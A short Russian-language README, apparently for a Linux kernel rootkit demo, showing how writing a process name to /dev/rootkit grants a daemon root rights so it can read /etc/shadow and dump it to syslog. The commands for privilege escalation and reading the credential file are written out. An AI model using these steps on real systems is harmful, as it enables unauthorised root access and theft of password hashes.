rootkit

Модуль при загрузке создает файл устройства "/dev/rootkit"

Запускаем демон "./mydaemon -c start"

Заставляем читать демон системный файл "/etc/shadow". 
"./mydaemon -c read"
Прав не хватает и он плачет в syslog об этом.

Error file open: Permission denied

"Повышаем" права демона
echo "mydaemon" > /dev/rootkit

Просим повторить демона процедуру чтения. Успех.
В syslog появилось содержимое файла "/etc/shadow"

=======
